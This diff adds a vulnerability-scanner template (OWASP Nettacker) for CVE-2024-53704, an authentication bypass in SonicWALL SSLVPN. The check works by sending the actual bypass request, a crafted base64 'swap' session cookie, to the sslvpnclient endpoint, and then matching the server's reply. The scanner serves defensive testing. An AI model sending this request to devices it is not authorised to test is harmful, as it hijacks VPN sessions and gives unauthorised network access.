@@ -1,0 +1,58 @@
+info:
+  name: sonicwall_sslvpn_cve_2024_53704_vuln
+  author: OWASP Nettacker team 
+  severity: 8.2
+  description: CVE-2024-53704 Is an Improper Authentication vulnerability in the SonicWALL SSLVPN authentication mechanism which allows a remote attacker to bypass authentication.
+  reference: 
+    - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003
+    - https://bishopfox.com/blog/sonicwall-cve-2024-53704-ssl-vpn-session-hijacking
+    - https://www.cisa.gov/news-events/alerts/2025/02/18/cisa-adds-two-known-exploited-vulnerabilities-catalog
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve
+    - sonicwall
+    - cisa_kev
+  
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          Host: "{target}"
+          User-Agent: "{user_agent}"
+          Cookie: 'swap=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:  
+                - "cgi-bin/sslvpnclient?launchplatform="
+              schema:
+                - "https"
+              ports:
+                - 443
+                - 4433
+                - 4443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            header:
+              Server:
+                regex: 'SonicWALL SSLVPN Web Server'
+                reverse: false
+            content:
+              regex: 'NELaunchX1'
+              reverse: false
